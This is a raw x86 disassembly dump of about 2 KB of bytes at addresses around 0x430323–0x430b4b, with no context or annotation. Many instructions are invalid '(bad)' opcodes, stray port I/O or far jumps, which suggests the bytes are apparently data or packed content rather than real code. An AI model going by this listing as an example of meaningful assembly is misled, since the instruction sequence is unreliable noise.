  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
